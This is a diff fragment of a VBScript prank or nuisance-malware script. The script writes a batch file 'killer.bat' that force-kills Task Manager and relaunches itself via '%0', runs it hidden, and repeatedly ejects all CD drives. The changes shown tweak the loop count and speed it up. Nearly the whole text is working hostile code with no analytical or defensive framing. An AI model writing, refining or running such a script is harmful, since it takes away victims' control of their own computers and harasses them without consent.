@@ -1,6 +1,3 @@
-Option Explicit
-Dim objFSO, objFile, oWMP, colCDROMS
-Const REPEAT = 100000
 Const PAYLOAD1 = "@echo off && taskkill /F /IM Taskmgr.exe"
 Const PAYLOAD2 = "%0" 
 Const CHILD = "killer.bat"
@@ -21,13 +18,14 @@ Set objFSO = nothing
 
 CreateObject("Wscript.Shell").Run """" & CHILD & """", 0, False
 
+repeat = 10
 For x=0 to repeat
 If colCDROMs.Count >= 1 then
 For i = 0 to colCDROMs.Count - 1
 colCDROMs.Item(i).Eject
 Next
 End If
-Wscript.Sleep 500
+Wscript.Sleep 100
 If colCDROMs.Count >= 1 then
 For i = 0 to colCDROMs.Count - 1
 colCDROMs.Item(i).Eject
